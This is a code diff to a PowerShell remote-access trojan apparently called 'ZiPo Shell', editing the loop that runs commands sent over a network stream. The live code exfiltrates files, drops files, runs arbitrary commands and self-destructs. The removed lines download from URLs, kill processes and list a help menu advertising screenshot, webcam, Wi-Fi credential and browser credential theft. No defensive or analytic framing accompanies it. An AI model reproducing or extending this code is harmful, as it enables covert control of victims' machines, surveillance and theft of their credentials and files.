@@ -114,11 +114,19 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
-                        $response = [string]::IsNullOrWhiteSpace($path) ? "[ERROR] Usage: !get <path>" : Upload-File $path
+                        if ([string]::IsNullOrWhiteSpace($path)) {
+                            $response = "[ERROR] Usage: !get <full_path_to_file>"
+                        } else {
+                            $response = Upload-File $path
+                        }
                     }
                     elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
-                        $response = ($parts.Length -eq 3) ? Download-File $parts[1].Trim() $parts[2].Trim() : "[ERROR] INVALID POST FORMAT"
+                        if ($parts.Length -eq 3) {
+                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
+                        } else {
+                            $response = "[ERROR] INVALID POST FORMAT"
+                        }
                     }
                     elseif ($cmd -like "cd *") {
                         $target = $cmd.Substring(3).Trim()
@@ -144,57 +152,12 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     elseif ($cmd -eq "!tree") {
                         $response = Tree-List
                     }
-                    elseif ($cmd -like "!popup *") {
-                        $msg = $cmd.Substring(7)
-                        Add-Type -AssemblyName PresentationFramework
-                        [System.Windows.MessageBox]::Show($msg, "ZiPo Message", "OK", "Info")
-                        $response = "[+] Popup shown"
-                    }
-                    elseif ($cmd -eq "!ps") {
-                        $response = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Out-String
-                    }
-                    elseif ($cmd -like "!kill *") {
-                        $pid = $cmd.Substring(6).Trim()
-                        try {
-                            Stop-Process -Id $pid -Force
-                            $response = "[OK] Killed PID $pid"
-                        } catch {
-                            $response = "[ERROR] Failed to kill $pid: $($_.Exception.Message)"
-                        }
-                    }
-                    elseif ($cmd -like "!download-url *") {
-                        $url = $cmd.Substring(14).Trim()
-                        $filename = Split-Path $url -Leaf
-                        $path = "$env:TEMP\$filename"
-                        Invoke-WebRequest $url -OutFile $path -UseBasicParsing
-                        $response = Upload-File $path
-                    }
                     elseif ($cmd -eq "!selfdestruct") {
                         $response = "[!] Self-destruct initiated..."
                         $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                         $stream.Write($outBytes, 0, $outBytes.Length)
                         $stream.Flush()
                         Self-Destruct
-                    }
-                    elseif ($cmd -eq "!help") {
-                        $response = @"
-ZiPo Shell Commands:
-!get <path>            - Download file
-!post fname::b64       - Upload file
-!cd <path>             - Change directory
-!sysinfo               - System info
-!screenshot            - Screenshot
-!webcam                - Webcam photo
-!wifi                  - Wi-Fi creds
-!creds                 - Browser creds (placeholder)
-!tree                  - Recursive tree
-!popup <msg>           - Show message
-!ps                    - List processes
-!kill <pid>            - Kill process
-!download-url <url>    - Download and send file
-!selfdestruct          - Remove self
-!help                  - This help
-"@
                     }
                     else {
                         $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
